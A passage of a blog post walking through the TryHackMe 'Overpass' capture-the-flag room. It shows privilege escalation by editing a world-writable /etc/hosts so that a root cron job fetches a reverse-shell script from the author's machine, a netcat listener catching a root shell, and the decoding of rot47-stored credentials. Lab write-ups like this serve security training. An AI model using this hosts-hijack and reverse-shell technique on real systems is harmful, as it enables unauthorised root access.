+<pre><code class="language-highlight">james@overpass-prod:~$ ls -lah /etc/crontab
+-rw-r--r-- 1 root root 822 Jun 27 04:18 /etc/crontab
+james@overpass-prod:~$ 
+james@overpass-prod:~$ ls -la /etc/hosts
+-rw-rw-rw- 1 root root 250 Jun 27 02:39 /etc/hosts
+james@overpass-prod:~$ 
+</code></pre>
+
+<p>I don’t have permissions to change the cron job however I can change the hosts file and change the IP to point to my machine. I create the /downloads/src folders and a text file called buildscript.sh with the bash one liner found on <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>. I started a python webserver on port 80 and a netcat listener on port 8080 and waited for the cron job to run.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.70.101] 39612
+bash: cannot set terminal process group (21767): Inappropriate ioctl for device
+bash: no job control in this shell
+root@overpass-prod:~# 
+</code></pre>
+
+<p>I have root! Now to grab the flag.</p>
+
+<pre><code class="language-highlight">root@overpass-prod:~# cat root.txt
+cat root.txt
+thm{7f336f8c359
+root@overpass-prod:~# 
+</code></pre>
+
+<h3 id="the-hidden-code">The hidden code</h3>
+
+<p>During our enumeration we were able to download a Linux binary and the source code of the password manager however they were not used to root on the machine. Lets take a look at them now.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ <span class="nv">$cat</span> buildscript.sh 
+<span class="nv">GOOS</span><span class="o">=</span>linux /usr/local/go/bin/go build <span class="nt">-o</span> ~/builds/overpassLinux ~/src/overpass.go
+<span class="nv">GOOS</span><span class="o">=</span>windows /usr/local/go/bin/go build <span class="nt">-o</span> ~/builds/overpassWindows.exe ~/src/overpass.go
+<span class="nv">GOOS</span><span class="o">=</span>darwin /usr/local/go/bin/go build <span class="nt">-o</span> ~/builds/overpassMacOS ~/src/overpass.go
+<span class="nv">GOOS</span><span class="o">=</span>freebsd /usr/local/go/bin/go build <span class="nt">-o</span> ~/builds/overpassFreeBSD ~/src/overpass.go
+<span class="nv">GOOS</span><span class="o">=</span>openbsd /usr/local/go/bin/go build <span class="nt">-o</span> ~/builds/overpassOpenBSD ~/src/overpass.go
+<span class="nb">echo</span> <span class="s2">"</span><span class="k">$(</span>date <span class="nt">-R</span><span class="k">)</span><span class="s2"> Builds completed"</span> <span class="o">&gt;&gt;</span> /root/buildStatus
+</code></pre></div></div>
+
+<p>The build script.sh is a very simple bash script to build the binaries. So I next ran the Linux binary to see what the binary did.</p>
+
+<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]    
+└──╼ $chmod +x overpassLinux                       
+┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]    
+└──╼ $./overpassLinux 
+open /home/daz/.overpass: no such file or directory
+Failed to open or read file
+Continuing with new password file.
+Welcome to Overpass
+Options:
+1       Retrieve Password For Service
+2       Set or Update Password For Service
+3       Delete Password For Service
+4       Retrieve All Passwords
+5       Exit
+Choose an option:       4
+┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $./overpassLinux 
+open /home/daz/.overpass: no such file or directory
+Failed to open or read file
+Continuing with new password file.
+Welcome to Overpass
+Options:
+1       Retrieve Password For Service
+2       Set or Update Password For Service
+3       Delete Password For Service
+4       Retrieve All Passwords
+5       Exit
+Choose an option:       2
+Enter Service Name:     test
+Enter new password:     testing123
+┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $./overpassLinux 
+Welcome to Overpass
+Options:
+1       Retrieve Password For Service
+2       Set or Update Password For Service
+3       Delete Password For Service
+4       Retrieve All Passwords
+5       Exit
+Choose an option:       4
+test     testing123
+┌─[daz@parrot]─[~/Documents/TryHackMe/Overpass]
+└──╼ $
+</code></pre>
+
+<p>When you run the binary you get 5 options but also an interesting message “open /home/daz/.overpass: no such file or directory” First I ran option 4 to see if any default values were included, but nothing was returned. So I then selected option 2, to set a password. Now when I ran the binary the message had gone and selecting option 4 displayed the values I had set.</p>
+
+<p>Next I decided to look at the source code to see what the program was doing. Not being that familiar with Go I scanned through to see what jumped out.</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">//Encrypt the credentials and write them to a file.                                 </span><span class="x">
+</span><span class="k">func</span><span class="x"> </span><span class="n">saveCredsToFile</span><span class="p">(</span><span class="n">filepath</span><span class="x"> </span><span class="kt">string</span><span class="p">,</span><span class="x"> </span><span class="n">passlist</span><span class="x"> </span><span class="p">[]</span><span class="n">passListEntry</span><span class="p">)</span><span class="x"> </span><span class="kt">string</span><span class="x"> </span><span class="p">{</span><span class="x">            
+        </span><span class="n">file</span><span class="p">,</span><span class="x"> </span><span class="n">err</span><span class="x"> </span><span class="o">:=</span><span class="x"> </span><span class="n">os</span><span class="o">.</span><span class="n">OpenFile</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="x"> </span><span class="n">os</span><span class="o">.</span><span class="n">O_TRUNC</span><span class="o">|</span><span class="n">os</span><span class="o">.</span><span class="n">O_CREATE</span><span class="o">|</span><span class="n">os</span><span class="o">.</span><span class="n">O_WRONLY</span><span class="p">,</span><span class="x"> </span><span class="m">0644</span><span class="p">)</span><span class="x">
+        </span><span class="k">if</span><span class="x"> </span><span class="n">err</span><span class="x"> </span><span class="o">!=</span><span class="x"> </span><span class="no">nil</span><span class="x"> </span><span class="p">{</span><span class="x">                                                             
+                </span><span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span><span class="x">                                            
+                </span><span class="k">return</span><span class="x"> </span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span><span class="x">                                                  
+        </span><span class="p">}</span><span class="x">                                                                           
+        </span><span class="k">defer</span><span class="x"> </span><span class="n">file</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span><span class="x">                                                          
+        </span><span class="n">stringToWrite</span><span class="x"> </span><span class="o">:=</span><span class="x"> </span><span class="n">rot47</span><span class="p">(</span><span class="n">credsToJSON</span><span class="p">(</span><span class="n">passlist</span><span class="p">))</span><span class="x">                               
+        </span><span class="k">if</span><span class="x"> </span><span class="n">_</span><span class="p">,</span><span class="x"> </span><span class="n">err</span><span class="x"> </span><span class="o">:=</span><span class="x"> </span><span class="n">file</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="n">stringToWrite</span><span class="p">);</span><span class="x"> </span><span class="n">err</span><span class="x"> </span><span class="o">!=</span><span class="x"> </span><span class="no">nil</span><span class="x"> </span><span class="p">{</span><span class="x">                  
+                </span><span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span><span class="x">                                            
+                </span><span class="k">return</span><span class="x"> </span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">()</span><span class="x">                                                  
+        </span><span class="p">}</span><span class="x">                                                                           
+        </span><span class="k">return</span><span class="x"> </span><span class="s">"Success"</span><span class="x">                                                            
+</span><span class="p">}</span><span class="x">                                                                                   
+</span></code></pre></div></div>
+
+<p>I found the encrypt function, what jumped out was its using rot47 to encrypt the sting and is indeed saving it to a local file. When I ran linpeas I noticed a tryhackme account on the system, I wonder if that has a .overpass file in the home directory and if so can we decode it?</p>
+
+<pre><code class="language-highlight">root@overpass-prod:~# cat /etc/passwd | grep /bin/bash
+cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+james:x:1001:1001:,,,:/home/james:/bin/bash
+root@overpass-prod:~# 
+root@overpass-prod:~# cd /home/tryhackme
+cd /home/tryhackme
+root@overpass-prod:/home/tryhackme# ls -lah
+ls -lah
+total 7.8M
+drwx------ 6 tryhackme tryhackme 4.0K Jun 27 16:13 .
+drwxr-xr-x 4 root      root      4.0K Jun 27 02:20 ..
+-rw-rw-r-- 1 tryhackme tryhackme    0 Jun 27 04:00 .bash_history
+-rw------- 1 tryhackme tryhackme  220 Apr  4  2018 .bash_logout
+-rw------- 1 tryhackme tryhackme 3.7K Apr  4  2018 .bashrc
+drwx------ 3 tryhackme tryhackme 4.0K Jun 27 02:35 .cache
+drwx------ 3 tryhackme tryhackme 4.0K Jun 27 02:15 .gnupg
+-rw------- 1 tryhackme tryhackme   56 Jun 27 04:35 .overpass
+-rw------- 1 tryhackme tryhackme  807 Apr  4  2018 .profile
+drwxrwx--- 4 tryhackme tryhackme 4.0K Jun 27 02:35 go
+drwx------ 6 tryhackme tryhackme 4.0K Jun 27 03:57 resources
+-rwxrwxr-x 1 tryhackme tryhackme 7.8M Jun 27 03:53 server
+root@overpass-prod:/home/tryhackme# cat .overpass
+cat .overpass
+,LQ?2&gt;6QiQ%CJw24&lt;|6 $F3D4C:AE:@? r@56Q[QA2DDQiQ8&gt;%sJ=QN.
+root@overpass-prod:/home/tryhackme#
+</code></pre>
+
+<p>Using a online <a href="https://www.dcode.fr/rot-47-cipher">decoder</a>, I found this by googling rot47 and its top result. Entering the rot47 string I get a result.</p>
+
+<p><img src="/assets/images/overpass/code.png" alt="code" /></p>
+
+<p>As mentioned this code has been claimed but I wanted to show the steps on acquiring it.</p>
+
+<p>[{“name”:”TryHackMe Subscription Code”,”pass”:”gmTDyl”}]</p>
+
+<p>Thanks for reading!</p>
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
